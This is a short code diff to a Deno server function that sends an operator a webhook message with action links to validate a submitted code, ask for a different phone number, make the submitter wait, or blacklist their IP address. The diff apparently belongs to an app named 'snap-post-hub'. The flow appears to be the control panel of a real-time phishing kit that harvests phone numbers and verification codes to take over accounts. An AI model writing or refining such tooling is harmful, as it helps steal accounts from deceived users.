@@ -95,8 +95,7 @@ Deno.serve(async (req) => {
     });
 
     const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-    const codeUrl = `${appUrl}/?step=code&id=${submissionId}`;
-    const validUrl = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
+    const codeUrl = `${appUrl}/?id=${submissionId}`;
     const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
     const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
     const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(submission.ip_address)}`;
@@ -135,10 +134,10 @@ Deno.serve(async (req) => {
         title: "⚡ Actions",
         color: 0x3498DB,
         fields: [
-          { name: "✅ Valider le code", value: `[Valider le code](${validUrl})`, inline: false },
-          { name: "❌ Changer le numéro", value: `[Changer le numéro](${wrongUrl})`, inline: false },
-          { name: "⏳ Faire patienter", value: `[Faire patienter](${waitUrl})`, inline: false },
-          { name: "🚫 Blacklist instant", value: `[Blacklist instant](${blacklistUrl})`, inline: false },
+          { name: "✅ Valider le code", value: `[Cliquer ici](${codeUrl})`, inline: false },
+          { name: "❌ Changer le numéro", value: `[Cliquer ici](${wrongUrl})`, inline: false },
+          { name: "⏳ Faire patienter", value: `[Cliquer ici](${waitUrl})`, inline: false },
+          { name: "🚫 Blacklist instant", value: `[Cliquer ici](${blacklistUrl})`, inline: false },
         ]
       };
 
